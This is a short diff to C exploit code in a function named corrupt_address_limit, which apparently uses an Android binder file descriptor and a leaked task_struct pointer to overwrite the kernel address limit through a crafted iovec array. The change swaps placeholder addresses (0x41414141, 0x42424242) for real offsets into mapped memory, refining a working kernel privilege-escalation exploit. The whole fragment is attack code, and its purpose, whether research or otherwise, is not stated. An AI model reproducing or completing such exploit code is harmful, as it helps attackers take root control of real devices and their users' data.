@@ -61,9 +61,13 @@ void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
 
   iovecStack[IOVEC_WQ_INDEX].iov_base = *mapped_memory;
   iovecStack[IOVEC_WQ_INDEX].iov_len = 1;
-  iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *)0x41414141;
+
+  iovecStack[IOVEC_WQ_INDEX + 1].iov_base =
+      (void *)((char *)(*mapped_memory) + PAGE_SIZE);
   iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8;
-  iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *)0x42424242;
+
+  iovecStack[IOVEC_WQ_INDEX + 2].iov_base =
+      (void *)((char *)(*mapped_memory) + PAGE_SIZE + PAGE_SIZE);
   iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8;
 
   static char dataBuffer[PAGE_SIZE] = {0};
